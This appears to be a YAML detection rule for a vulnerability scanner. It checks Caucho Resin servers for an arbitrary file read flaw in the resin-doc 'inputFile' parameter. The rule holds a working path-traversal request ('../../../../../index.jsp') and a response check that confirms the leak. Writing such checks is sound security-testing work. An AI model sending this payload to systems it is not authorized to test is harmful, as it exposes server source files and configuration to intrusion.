expression: r0()
id: resin-inputfile-fileread-or-ssrf
info:
  author: whynot(https://github.com/notwhy)
  name: resin inputfile fileread
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes("<%@ page
      session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %>"))
    request:
      method: GET
      path: /resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp
